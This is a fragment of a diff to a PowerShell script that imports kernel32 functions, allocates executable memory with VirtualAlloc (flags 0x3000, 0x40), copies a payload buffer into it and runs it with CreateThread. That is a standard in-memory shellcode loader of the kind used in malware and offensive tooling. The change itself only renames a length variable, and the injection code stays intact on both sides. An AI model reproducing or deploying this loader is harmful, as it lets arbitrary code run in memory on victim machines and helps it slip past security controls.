@@ -4,6 +4,6 @@ $MethodDefinition ='[DllImport("kernel32.dll")] public static extern IntPtr Crea
 $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
 
 
-[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($length), 0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($length))
+[IntPtr]$ptr = $Kernel32::VirtualAlloc(0, [int][Math]::Floor($byte_length), 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($payload_data, 0, $ptr, [int][Math]::Floor($byte_length))
 $Kernel32::CreateThread(0, 0, $ptr, 0, 0, 0)
